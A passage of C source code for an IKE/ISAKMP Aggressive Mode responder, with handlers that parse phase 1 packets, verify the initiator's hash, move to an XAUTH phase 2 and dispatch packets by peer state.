	flatten_isakmp_packet(r, &dgm->data, &dgm->len, ctx->blk_len); /* 8 */
	dgm->peer_addr = ctx->peer_addr;
	dgm->sockfd = ctx->cfg->sockfd;
	send_datagram(dgm);

	ctx->state = STATE_PHASE1;
}

/*
 * Process the last IKE Aggressive Mode packet in phase 1, containing i_hash.
 * Brings us to phase 2 (hopefully).
 */
void ike_do_phase1_end(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	/* get the payloads */
	struct isakmp_payload *h = NULL;
	for(struct isakmp_payload *p = ikp->u.payload; p; p = p->next) {
	switch(p->type) {
		case ISAKMP_PAYLOAD_HASH:
			h = p;
			break;

		case ISAKMP_PAYLOAD_N:
		case ISAKMP_PAYLOAD_VID:
			/* silently ignore for now */
			break;

		default:
			printf("[%s:%d]: unhandled payload type 0x%02x, ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				p->type);
			break;
	}}

	/* do we have all payloads? */
	if(!h) {
		printf("[%s:%d]: missing payload: h=%p, ignored\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port),
			(void*)h);
		return;
	}

	/* verify hash */
	if(h->u.hash.length != ctx->md_len ||
		memcmp(h->u.hash.data, ctx->i_hash, ctx->md_len)) {
		printf("[%s:%d]: IKE phase 1 auth failed (i_hash mismatch)\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port));
		return;
	}
/*
	printf("[%s:%d]: IKE phase 1 complete\n",
		inet_ntoa(ctx->peer_addr.sin_addr),
		ntohs(ctx->peer_addr.sin_port));
*/
	ctx->state = STATE_PHASE2;
	ike_do_phase2_xauth_begin(ctx);
}

/*
 * Process an IKE packet in STATE_PHASE1.
 */
void ike_process_phase1(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	if(!(ikp->flags & ISAKMP_FLAG_E)) {
		printf("[%s:%d]: unencrypted packet in STATE_PHASE1, reset state\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port));
		reset_peer_ctx(ctx);
		ike_process_new(ctx, ikp);
		return;
	}

	switch(ikp->exchange_type) {
		case ISAKMP_EXCHANGE_AGGRESSIVE:
			if(!ike_crypt(ctx, ikp))
				ike_do_phase1_end(ctx, ikp);
			break;

		case ISAKMP_EXCHANGE_INFORMATIONAL:
			ike_process_informational(ctx, ikp);
			break;

		default:
			printf("[%s:%d]: unhandled exchange type 0x%02x in STATE_PHASE1, ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				ikp->exchange_type);
			break;
	}
}



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Phase 0 handler                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/* phase 0 is actually phase 1 before the key exchange is complete */

/*
 * Process an IKE packet in STATE_NEW.
 */
void ike_process_new(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	if(ikp->flags & ISAKMP_FLAG_E) {
		printf("[%s:%d]: encrypted packet in STATE_NEW, ignored\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port));
		return;
	}

	switch(ikp->exchange_type) {
		case ISAKMP_EXCHANGE_AGGRESSIVE:
			printf("[%s:%d]: IKE session initiated\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port));
			ike_do_phase1(ctx, ikp);
			break;

		case ISAKMP_EXCHANGE_INFORMATIONAL:
			ike_process_informational(ctx, ikp);
			break;

		default:
			printf("[%s:%d]: unhandled exchange type 0x%02x in STATE_NEW, ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				ikp->exchange_type);
			break;
	}
}



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Main packet handler                                                       *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Process an incoming IKE/ISAKMP packet.
 */
void ike_process_isakmp(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	/* need some mechanism to clean out old states after some time */
	/* maybe: if r_cookie == 0, reset to STATE_NEW */

	switch(ctx->state) {
		case STATE_NEW:
			ike_process_new(ctx, ikp);
			break;

		case STATE_PHASE1:
			ike_process_phase1(ctx, ikp);
			break;

		case STATE_PHASE2:
			ike_process_phase2(ctx, ikp);
			break;

		default:
			printf("[%s:%d]: unhandled state, reset state\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port));
			reset_peer_ctx(ctx);
			ike_process_new(ctx, ikp);
			break;
	}

}

